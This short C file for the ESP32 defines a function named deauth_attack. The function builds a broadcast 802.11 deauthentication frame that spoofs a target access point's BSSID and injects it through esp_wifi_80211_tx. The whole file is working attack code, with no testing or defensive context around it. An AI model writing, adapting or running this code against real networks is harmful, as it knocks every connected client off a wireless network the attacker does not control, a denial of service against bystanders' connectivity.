#include "esp_wifi.h"
#include <string.h>
#include "esp_log.h"

static const char *TAG = "DEAUTH";

void deauth_attack(uint8_t *bssid) {
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
        0x00, 0x00, 0x01, 0x00
    };
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Failed to send deauth: %d", ret);
    }
}
